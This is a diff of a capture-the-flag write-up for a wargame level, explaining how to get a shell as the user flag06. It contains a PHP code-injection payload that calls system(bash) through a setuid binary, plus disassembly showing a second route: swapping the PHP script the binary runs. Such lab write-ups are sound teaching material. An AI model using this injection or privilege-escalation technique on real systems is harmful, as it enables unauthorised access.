@@ -6,9 +6,31 @@ The other is an elf binary which calls the php script above, but with flag06's r
 Hence, we can create a file matching the regex containing code to be executed, like
 the system function. Let's use it to get a shell.
 
--> echo '[x {${@system(bash)}}]' > /tmp/exploit
--> ./level06 /tmp/exploit
+$> echo '[x {${@system(bash)}}]' > /tmp/exploit
+$> ./level06 /tmp/exploit
 
-Aaaand, we have a shell as flag06.
+And here appears a shell as flag06.
 
 We can now get the next flag.
+
+-------------------------------------------------------------
+
+Second method :
+
+in level06 you can see :
+
+ 80484ff:	c7 45 d4 d5 87 04 08 	mov    DWORD PTR [ebp-0x2c],0x80487d5
+ 8048506:	c7 45 d8 e2 87 04 08 	mov    DWORD PTR [ebp-0x28],0x80487e2
+ 804850d:	c7 45 e4 00 00 00 00 	mov    DWORD PTR [ebp-0x1c],0x0
+ 8048514:	e8 17 ff ff ff       	call   8048430 <execve@plt>
+
+(gdb)$> x/s 0x80487d5
+
+0x80487d5:	 "/usr/bin/php"
+
+(gdb)$> x/s 0x80487e2
+
+0x80487e2:	 "/home/user/level06/level06.php"
+
+level06 call level06.php with flag06 rights.
+If we replace this file with our own level06.php with full execution rights, we can do everything with flag06 rights!
